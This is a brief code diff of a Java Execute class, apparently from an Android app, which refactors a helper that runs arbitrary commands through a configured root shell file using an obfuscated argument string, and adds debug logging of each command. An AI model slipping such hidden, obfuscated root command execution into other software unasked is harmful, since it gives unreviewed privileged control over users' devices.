@@ -13,12 +13,13 @@ public class Execute {
 	private static final String TAG = "Execute";
 
 	public static ExecuteResult executeRoot(String command) {
-		if (Status.self().haveRoot()) {
-			String cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35_0"), command); // EXPORT
-			return execute(cmd);
-		} else {
-			return execute(command);
+		String cmd = command;
+		
+		if (Status.haveRoot()) {
+			cmd = String.format("%s %s %s", Configuration.shellFile, Messages.getString("35_0"), command); // EXPORT
 		}
+		
+		return execute(cmd);
 	}
 
 	public static ExecuteResult execute(String cmd) {
@@ -27,6 +28,10 @@ public class Execute {
 
 		Process localProcess = null;
 		ExecuteResult result = new ExecuteResult(cmd);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (execute) executing: " + cmd); //$NON-NLS-1$
+		}
 		
 		try {
 			localProcess = Runtime.getRuntime().exec(cmd);
@@ -37,7 +42,6 @@ public class Execute {
 		}
 
 		if (localProcess != null) {
-
 			try {
 				// BufferedWriter out = new BufferedWriter(new
 				// OutputStreamWriter(localProcess.getOutputStream()));
